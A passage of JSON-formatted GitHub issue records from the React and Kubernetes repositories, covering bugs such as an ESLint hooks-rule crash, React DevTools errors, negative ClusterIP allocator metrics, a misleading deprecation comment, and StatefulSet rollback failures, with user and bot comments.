phuoc-ng/react-pdf-viewer 0 errors\r\n[DONE] eliseumds/react-autocomplete 0 errors\r\n[DONE] moroshko/react-autosuggest 0 errors\r\n[DONE] prometheusresearch/react-autocomplete 0 errors\r\n[DONE] gragland/instatype 0 errors\r\n[DONE] paypal/downshift 0 errors\r\n[DONE] ericgio/react-bootstrap-typeahead 0 errors\r\n[DONE] matteobruni/tsparticles 0 errors\r\n[DONE] facebook/react-art 0 errors\r\n[DONE] Flipboard/react-canvas 0 errors\r\n[DONE] pilwon/react-famous 0 errors\r\n[DONE] kmkzt/react-hooks-svgdrawing 0 errors\r\n[DONE] gorangajic/react-svg-morph 0 errors\r\n[WARN] Linting kinetic-v5.1.0.js took 14s at freiksenet/react-kinetic/vendor\r\n[DONE] freiksenet/react-kinetic 0 errors\r\n[DONE] chrvadala/react-svg-pan-zoom 0 errors\r\n[DONE] reduction-admin/react-reduction 0 errors\r\n[DONE] jeffersonRibeiro/react-shopping-cart 0 errors\r\n[DONE] clintonwoo/hackernews-react-graphql 0 errors\r\n[DONE] firefox-devtools/debugger 0 errors\r\n[DONE] gaearon/overreacted.io 0 errors\r\n[WARN] Linting admin_definition.jsx took 6s at mattermost/mattermost-webapp/components/admin_console\r\n[DONE] dnote/dnote 0 errors\r\n[WARN] elastic/kibana crashed: no-useless-constructor\r\n[DONE] mattermost/mattermost-webapp 0 errors\r\n[WARN] elastic/kibana crashed: unable-to-parse-rule-id\r\n[DONE] elastic/kibana 8 errors\r\n[DONE] Finished scan of 164 repositories\r\n\r\n\u2728  Done in 3720.16s.\r\n```\r\n</details>\r\n", "issue_labels": ["Type: Bug", "Component: ESLint Rules"], "comments": [{"author": "AriPerkkio", "body": "Some debugging information:\r\nhttps://github.com/facebook/react/blob/13a62feab8c39bc0292eb36d636af0bb4f3a78df/packages/eslint-plugin-react-hooks/src/ExhaustiveDeps.js#L1644-L1646\r\nSeems like ChainExpressions are only expected to contain MemberExpressions. It doesn't consider CallExpressions. At this point:\r\n\r\n```js\r\nnode.type -> \"ChainExpression\"\r\nnode.expression.type -> \"CallExpression\"\r\nnode.expression.object -> undefined\r\nnode.expression.property -> undefined\r\n```\r\n\r\nTest case to cover this:\r\n```js\r\n{\r\n    code: normalizeIndent`\r\n    function MyComponent(props) {\r\n        function MyComponent(props) {\r\n            useEffect(() => {}, [props?.attribute.method()]);\r\n        }\r\n    }\r\n    `,\r\n}\r\n```\r\n\r\nI'm not 100% sure but this use case looks valid to me. https://github.com/elastic/kibana/blob/f49ee068f4f1a9ed126ae2abf6b3108dde594f36/x-pack/plugins/security_solution/public/detections/containers/detection_engine/rules/use_rules.tsx#L100\r\nIf it's not, at least the unexpected crashing should be prevented."}, {"author": "AriPerkkio", "body": "After going through the current test cases I think this is the expected behavior:\r\n```js\r\nuseEffect(() => {}, [someObject?.optionalField.method()]);\r\n// Expected: React Hook useEffect has a complex expression in the dependency array. Extract it to a separate variable so it can be statically checked.\r\n// Actual: Cannot read property 'type' of undefined -> No lint errors are displayed\r\n```\r\nThis is also what is reported for `[someObject.method()]`.  \r\n\r\nIf this doesn't look right, please let me know. I'll start to work on a fix at the end of the week. So far debugging this has been fun. \ud83d\ude04 "}, {"author": "nightvisi0n", "body": "> If this doesn't look right, please let me know.\r\n\r\nJust FYI: I also experienced this bug and it was triggered by exactly the scenario you have mentioned."}, {"author": "just-boris", "body": "The latest stable version 4.2.0 still contains this bug. Are there any plans on making a new release?\r\n\r\nI can confirm, it was fixed in nightly builds."}, {"author": "samundra", "body": "Has there been any update on it? I am also facing the similar issue.\r\n\r\n**Plugin versions**\r\n\r\n```\r\neslint-plugin-react: ^7.21.5\r\neslint-plugin-react-hooks: ^4.2.0\r\n```\r\n\r\n**Reproduction steps:**\r\n\r\n- start typing `React.useEffect(` as soon as I hit that `(` opening brace the error is shown.\r\n\r\n**Stack trace taken from Eslint Output from vscode**\r\n\r\n```shell\r\n[Error - 12:10:18 AM] ESLint stack trace:\r\n[Error - 12:10:18 AM] TypeError: Cannot read property 'type' of undefined\r\nOccurred while linting <file>:<line-number>\r\n    at visitCallExpression ([removed]/node_modules/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js:1734:24)\r\n    at [removed]/node_modules/eslint/lib/linter/safe-emitter.js:45:58\r\n    at Array.forEach (<anonymous>)\r\n    at Object.emit ([removed]/node_modules/eslint/lib/linter/safe-emitter.js:45:38)\r\n    at NodeEventGenerator.applySelector ([removed]/node_modules/eslint/lib/linter/node-event-generator.js:256:26)\r\n    at NodeEventGenerator.applySelectors ([removed]/node_modules/eslint/lib/linter/node-event-generator.js:285:22)\r\n    at NodeEventGenerator.enterNode ([removed]/node_modules/eslint/lib/linter/node-event-generator.js:299:14)\r\n    at CodePathAnalyzer.enterNode ([removed]/node_modules/eslint/lib/linter/code-path-analysis/code-path-analyzer.js:711:23)\r\n    at [removed]/node_modules/eslint/lib/linter/linter.js:954:32\r\n    at Array.forEach (<anonymous>)\r\n```"}, {"author": "just-boris", "body": "Please \ud83d\udc4f release \ud83d\udc4f the \ud83d\udc4f plugin \ud83d\udc4f already \ud83d\udc4f \r\n\r\n@gaearon "}, {"author": "abstain23", "body": "This problem still exists in version 4.2.0, but this problem will not occur when using version 1.7.0"}, {"author": "unstable-compound", "body": "Are there plans for a new release? This is still an issue for me, with   \r\n```\r\n  \"eslint-plugin-react\": \"7.26.1\",\r\n  \"eslint-plugin-react-hooks\": \"4.2.0\"\r\n  \"eslint\": \"7.32.0\",\r\n```\r\nand\r\n`    \"react\": \"17.0.2\"`,"}, {"author": "AriPerkkio", "body": "This is now included in the `eslint-plugin-react-hooks@4.3.0` release. "}, {"author": "gaearon", "body": "Sorry folks, I have thousands of GH notifications so I didn\u2019t see your comments. Please ping me on Twitter next time if you try to reach me, at least DMs there aren\u2019t as flooded. "}, {"author": "valtism", "body": "I am still getting this issue on `4.3.0`\r\n\r\nThe offending code is here, where `restrictToPath` is `SVGGeometryElement | null | undefined`\r\n\r\n```tsx\r\nconst samples = useMemo(() => {\r\n    const parentSVG = getParentSVG(restrictToPath);\r\n    const transform = parentSVG?.getCTM() || new DOMMatrix();\r\n    return getSamples(restrictToPath, transform);\r\n  }, [restrictToPath?.getTotalLength()]);\r\n  ```\r\n\r\nThis is running through `vite` with the following dev dependencies:\r\n\r\n```json\r\n\"devDependencies\": {\r\n    \"@nabla/vite-plugin-eslint\": \"^1.3.2\",\r\n    \"@types/d3-format\": \"^3.0.1\",\r\n    \"@types/react\": \"^17.0.27\",\r\n    \"@types/react-dom\": \"^17.0.9\",\r\n    \"@typescript-eslint/eslint-plugin\": \"^4.33.0\",\r\n    \"@typescript-eslint/parser\": \"^4.33.0\",\r\n    \"@vitejs/plugin-react\": \"^1.0.2\",\r\n    \"autoprefixer\": \"^10.3.7\",\r\n    \"eslint\": \"^7.32.0\",\r\n    \"eslint-plugin-react\": \"^7.27.1\",\r\n    \"eslint-plugin-react-hooks\": \"^4.3.0\",\r\n    \"postcss\": \"^8.3.9\",\r\n    \"tailwindcss\": \"^3.0.0-alpha.1\",\r\n    \"typescript\": \"^4.4.4\",\r\n    \"vite\": \"^2.6.12\"\r\n  }\r\n```\r\n\r\nI deleted my `.eslintcache` as well as restarting the dev server, but no luck. I get the following error:\r\n\r\n`[Info  - 9:58:06 AM] Cannot read property 'type' of undefined Occurred while linting .../src/useDrag.ts:210`"}, {"author": "gaearon", "body": "Please send a failing regression test case similar to https://github.com/facebook/react/pull/20247/files, either with or without a fix. "}]}
{"repo": "facebook/react", "issue_number": 31745, "issue_url": "https://github.com/facebook/react/issues/31745", "issue_title": "[Compiler Bug]: Handle TSInstantiationExpression expressions", "issue_author": "artsiomshaitar", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhHCA7MAXABABwEMYwFcBeXAHgCUAaXAQQD4AKAN0IBsoFkmAlPxoVmuYAB0MuXAHpZBYqVwAzKBjjYAlplwB3LdgAWuSAFsyZwgHMtcXFqxaAJggB0HqTJgJssaZw8CFIAvlJSCAAe+BAweGoa2roAKgg4AMIQZvhaXAgwrALiXrjoWHjWvgAihNiEFLiForgACjBZWqRuPpBc7AisANoAugLh0nIAVLjJRp2lWTl5YKqOZJOyJWU4uM619ZSV2DV1hW7GCBisRCQIYxglstOz88bteiuE0vntMLgbjwU2zwezqDSOJ0IZwuVxupCoOBgjmsI2Y9xKPj8MGkVEYGAgFxgmWymEueECvHIwFBhBCcmYoSkIBCQA\n\n### Repro steps\n\nBasically, just use typescript's instantiation expressions inside a component\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-37ed2a7-20241206", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": []}
{"repo": "facebook/react", "issue_number": 32270, "issue_url": "https://github.com/facebook/react/issues/32270", "issue_title": "[DevTools Bug]:  [DevTools Bug] Minified React error #482; visit https://react.dev/errors/482 for the full message or use the non-minified dev environment for full errors and additional helpful warnings.", "issue_author": "Omniakhalid", "issue_body": "### Website or app\n\n.\n\n### Repro steps\n\n l\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-core\n\n### DevTools version (automated)\n\n6.1.0-b000019578\n\n### Error message (automated)\n\nMinified React error #482; visit https://react.dev/errors/482 for the full message or use the non-minified dev environment for full errors and additional helpful warnings.\n\n### Error call stack (automated)\n\n```text\nat Kn (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:39401)\n    at Hi (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:42343)\n    at Object.xi [as use] (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:42548)\n    at r.use (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:192248)\n    at _c (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1236618)\n    at bi (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:40820)\n    at ws (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:67103)\n    at Ps (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:77664)\n    at Lc (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:130024)\n    at Ic (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:129952)\n```\n\n### Error component stack (automated)\n\n```text\nat _c (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1236495)\n    at Suspense (<anonymous>)\n    at mc (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1236875)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at gc (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1237296)\n    at jl (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1199270)\n    at Ys (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1188038)\n    at div (<anonymous>)\n    at ll (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1194130)\n    at Hu (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1223199)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at Li (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1147930)\n    at as (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1171997)\n    at /opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1259938\n    at Ys (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1188038)\n    at /opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1190694\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at Qs (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1190528)\n    at ef (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1261615)\n    at zc (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1254178)\n    at Tt (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1093495)\n    at fa (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1120789)\n    at kc (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1242298)\n    at Q_ (/opt/homebrew/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1397027)\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Minified React error #482; visit https://react.dev/errors/482 for the full message or use the non-minified dev environment for full errors and additional helpful warnings. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": []}
{"repo": "facebook/react", "issue_number": 32192, "issue_url": "https://github.com/facebook/react/issues/32192", "issue_title": "[DevTools Bug]:  Support Iterables in React DevTools", "issue_author": "atharv9017", "issue_body": "### Website or app\n\nReact DevTools\n\n### Repro steps\n\n1.Open a React app using React 19.0.0.\n2.Pass an Iterable<T> to a component's props or state.\n3.Inspect the component using React DevTools.\n4.Observe the display or handling of the Iterable.\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n```text\n\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\n\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": []}
{"repo": "kubernetes/kubernetes", "issue_number": 134509, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134509", "issue_title": "kube_apiserver clusterip_allocator available_ips reports negative available ips when using multiple servicecidr", "issue_author": "grosser", "issue_body": "### What happened?\n\n```\n\u276f kubectl get servicecidr\nNAME                       CIDRS            AGE\nkubernetes                 172.29.8.0/22    168d\nservice-cidr-extension-1   172.28.48.0/22   156d\n```\n\n```\nkubectl get ipaddress -A -l ipaddress.kubernetes.io/managed-by=ipallocator.k8s.io --no-headers | wc -l\n    1051\n```\n\n```\n# TYPE kube_apiserver_clusterip_allocator_allocated_ips gauge\nkube_apiserver_clusterip_allocator_allocated_ips{cidr=\"172.28.48.0/22\"} 1050\nkube_apiserver_clusterip_allocator_allocated_ips{cidr=\"172.29.8.0/22\"} 1051\n\n# TYPE kube_apiserver_clusterip_allocator_allocation_total counter\nkube_apiserver_clusterip_allocator_allocation_total{cidr=\"172.28.48.0/22\",scope=\"dynamic\"} 25\nkube_apiserver_clusterip_allocator_allocation_total{cidr=\"172.29.8.0/22\",scope=\"dynamic\"} 197\n\n# TYPE kube_apiserver_clusterip_allocator_available_ips gauge\nkube_apiserver_clusterip_allocator_available_ips{cidr=\"172.28.48.0/22\"} -28\nkube_apiserver_clusterip_allocator_available_ips{cidr=\"172.29.8.0/22\"} -28\n```\n\n### What did you expect to happen?\n\nno negative numbers\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\ncreate cluster with multiple service cidrs and create more services than the first cird can hold\n(or just observe that available ips is not the sum of both cidrs)\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\nServer Version: v1.33.4\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\naws\n</details>\n\n\n### OS version\n\n_No response_\n\n### Install tools\n\n_No response_\n\n### Container runtime (CRI) and version (if applicable)\n\n_No response_\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n_No response_", "issue_labels": ["kind/bug", "sig/network", "triage/accepted"], "comments": [{"author": "BenTheElder", "body": "/sig network\ncc @aojea "}, {"author": "aojea", "body": "OMG, so `kube_apiserver_clusterip_allocator_available_ips` seems to only consider the first range for total number of ips, and when it substracts the number of allocated it gives a negative number\n\nThis is the metric\n\nhttps://github.com/kubernetes/kubernetes/blob/0a4651c9910533f4649b8a11c334cf23237b1ccc/pkg/registry/core/service/ipallocator/metrics.go#L45-L53\n\nI need to look more careful but it seems the metrics system is not handling well the multiple allocators on the system https://github.com/kubernetes/kubernetes/blob/0a4651c9910533f4649b8a11c334cf23237b1ccc/pkg/registry/core/service/ipallocator/ipallocator.go"}, {"author": "BenTheElder", "body": "/triage accepted"}, {"author": "ramzeng", "body": "https://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/service/ipallocator/ipallocator.go#L427\n\nThe Used() method appears to count all IPs across CIDRs, not just IPs in the current CIDR, which might be causing the negative values."}, {"author": "ramzeng", "body": "/assign"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 117829, "issue_url": "https://github.com/kubernetes/kubernetes/issues/117829", "issue_title": "Invalid deprecation information in k8s.io/apimachinery/pkg/util/wait", "issue_author": "antoninbas", "issue_body": "### What happened?\n\nThe comments for `NewExponentialBackoffManager` read:\r\n```go\r\n// NewExponentialBackoffManager returns a manager for managing exponential backoff. Each backoff is jittered and\r\n// backoff will not exceed the given max. If the backoff is not called within resetDuration, the backoff is reset.\r\n// This backoff manager is used to reduce load during upstream unhealthiness.\r\n//\r\n// Deprecated: Will be removed when the legacy Poll methods are removed. Callers should construct a\r\n// Backoff struct, use DelayWithReset() to get a DelayFunc that periodically resets itself, and then\r\n// invoke Timer() when calling wait.BackoffUntil.\r\n//\r\n// Instead of:\r\n//\r\n//\tbm := wait.NewExponentialBackoffManager(init, max, reset, factor, jitter, clock)\r\n//\t...\r\n//\twait.BackoffUntil(..., bm.Backoff, ...)\r\n//\r\n// Use:\r\n//\r\n//\tdelayFn := wait.Backoff{\r\n//\t  Duration: init,\r\n//\t  Cap:      max,\r\n//\t  Steps:    int(math.Ceil(float64(max) / float64(init))), // now a required argument\r\n//\t  Factor:   factor,\r\n//\t  Jitter:   jitter,\r\n//\t}.DelayWithReset(reset, clock)\r\n//\twait.BackoffUntil(..., delayFn.Timer(), ...)\r\n```\r\n\r\nIn particular, the comments are asking us to use `wait.BackoffUntil(..., delayFn.Timer(), ...)`.\r\n\r\nThis does not seem possible, given that the second parameter for `wait.BackoffUntil` is of type `BackoffManager` (interface), while `delayFn.Timer()` returns a `Timer` interface. Maybe the author intended to update the definition of `BackoffUntil` but ended up not doing so for backwards-compatible reasons.\r\n\r\nEven `wait.BackoffUntil(..., bm.Backoff, ...)` does not seem correct.\r\n\r\nThe documentation for this package needs to be revisited. At the moment, anyone using the latest version of this package would get deprecation warnings from linters, with no remediation possible.\n\n### What did you expect to happen?\n\nThe documentation should be correct.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nN/A\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\nK8s v1.27.1, but also master branch\n\n### Cloud provider\n\nN/A\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\n\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/api-machinery", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "antoninbas", "body": "cc @smarterclayton "}, {"author": "antoninbas", "body": "/sig api-machinery"}, {"author": "fedebongio", "body": "/assign @MikeSpreitzer @tkashem \r\n/triage accepted\r\n"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "fedebongio", "body": "/triage accepted\r\n"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/117829#issuecomment-3398495623):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 67250, "issue_url": "https://github.com/kubernetes/kubernetes/issues/67250", "issue_title": "StatefulSet - can't rollback from a broken state", "issue_author": "MrTrustor", "issue_body": "/kind bug\r\n\r\n**What happened**:\r\n\r\nI updated a StatefulSet with a non-existent Docker image. As expected, a pod of the statefulset is destroyed and can't be recreated (ErrImagePull). However, when I change back the StatefulSet with an existing image, the StatefulSet doesn't try to remove the broken pod to replace it by a good one. It keeps trying to pull the non-existing image.\r\nYou have to delete the broken pod manually to unblock the situation.\r\n\r\n[Related Stackoverflow question](https://stackoverflow.com/questions/48894414/kubernetes-statefulset-pod-startup-error-recovery)\r\n\r\n**What you expected to happen**:\r\n\r\nWhen rolling back the bad config, I expected the StatefulSet to remove the broken pod and replace it by a good one.\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\n\r\n1. Deploy the following StatefulSet:\r\n```\r\napiVersion: apps/v1\r\nkind: StatefulSet\r\nmetadata:\r\n  name: web\r\nspec:\r\n  selector:\r\n    matchLabels:\r\n      app: nginx # has to match .spec.template.metadata.labels\r\n  serviceName: \"nginx\"\r\n  replicas: 3 # by default is 1\r\n  template:\r\n    metadata:\r\n      labels:\r\n        app: nginx # has to match .spec.selector.matchLabels\r\n    spec:\r\n      terminationGracePeriodSeconds: 10\r\n      containers:\r\n      - name: nginx\r\n        image: k8s.gcr.io/nginx-slim:0.8\r\n        ports:\r\n        - containerPort: 80\r\n          name: web\r\n        volumeMounts:\r\n        - name: www\r\n          mountPath: /usr/share/nginx/html\r\n  volumeClaimTemplates:\r\n  - metadata:\r\n      name: www\r\n    spec:\r\n      accessModes: [ \"ReadWriteOnce\" ]\r\n      storageClassName: \"standard\"\r\n      resources:\r\n        requests:\r\n          storage: 10Gi\r\n```\r\n\r\n2. Once the 3 pods are running, update the StatefulSet spec and change the image to `k8s.gcr.io/nginx-slim:foobar`\r\n3. Observe the new pod failing to pull the image.\r\n4. Roll back the change.\r\n5. Observe the broken pod not being deleted.\r\n\r\n**Anything else we need to know?**:\r\n\r\n* I observed this behaviour both on 1.8 and 1.10.\r\n* This seems related to the discussion in #18568\r\n\r\n**Environment**:\r\n- Kubernetes version (use `kubectl version`):\r\n```\r\nClient Version: version.Info{Major:\"1\", Minor:\"9\", GitVersion:\"v1.9.7\", GitCommit:\"dd5e1a2978fd0b97d9b78e1564398aeea7e7fe92\", GitTreeState:\"clean\", BuildDate:\"2018-04-19T00:05:56Z\", GoVersion:\"go1.9\r\n.3\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\nServer Version: version.Info{Major:\"1\", Minor:\"10+\", GitVersion:\"v1.10.5-gke.3\", GitCommit:\"6265b9797fc8680c8395abeab12c1e3bad14069a\", GitTreeState:\"clean\", BuildDate:\"2018-07-19T23:02:51Z\", GoVersi\r\non:\"go1.9.3b4\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\n```\r\n- Cloud provider or hardware configuration: Google Kubernetes Engine\r\n- OS (e.g. from /etc/os-release): COS\r\n\r\ncc @joe-boyce", "issue_labels": ["kind/bug", "sig/scheduling", "sig/apps", "sig/architecture", "lifecycle/frozen"], "comments": [{"author": "MrTrustor", "body": "/sig apps\r\n/sig scheduling"}, {"author": "joe-boyce", "body": "Anybody have any ideas on this one?"}, {"author": "enisoc", "body": "As far as I can tell, StatefulSet doesn't make any attempt to support this use case, namely using a rolling update to fix a StatefulSet that's in a broken state. If any of the existing Pods are broken, it appears that StatefulSet bails out before even reaching the rolling update code:\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/30e4f528ed30a70bdb0c14b5cfe49d00a78194c2/pkg/controller/statefulset/stateful_set_control.go#L428-L435\r\n\r\nI haven't found any mention of this limitation in the docs, but it's possible that it was a choice made intentionally to err on the side of caution (stop and make the human decide) since stateful data is at stake and stateful Pods often have dependencies on each other (e.g. they may form a cluster/quorum).\r\n\r\nWith that said, I agree it would be ideal if StatefulSet supported this, at least for clear cases like this one where deleting a Pod that's stuck Pending is unlikely to cause any additional damage.\r\n\r\ncc @kow3ns "}, {"author": "mattmb", "body": "+1, I just discovered this and had assumed that it would work more like the Deployment controller.\r\n\r\nIn https://github.com/yelp/paasta we are programmatically creating/updating Deployments and StatefulSets. For that to make sense I really want them to *always* attempt to converge to the definition."}, {"author": "fejta-bot", "body": "Issues go stale after 90d of inactivity.\nMark the issue as fresh with `/remove-lifecycle stale`.\nStale issues rot after an additional 30d of inactivity and eventually close.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle stale"}, {"author": "fejta-bot", "body": "Stale issues rot after 30d of inactivity.\nMark the issue as fresh with `/remove-lifecycle rotten`.\nRotten issues close after an additional 30d of inactivity.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle rotten"}, {"author": "fejta-bot", "body": "Rotten issues close after 30d of inactivity.\nReopen the issue with `/reopen`.\nMark the issue as fresh with `/remove-lifecycle rotten`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/close"}, {"author": "k8s-ci-robot", "body": "@fejta-bot: Closing this issue.\n\n<details>\n\nIn response to 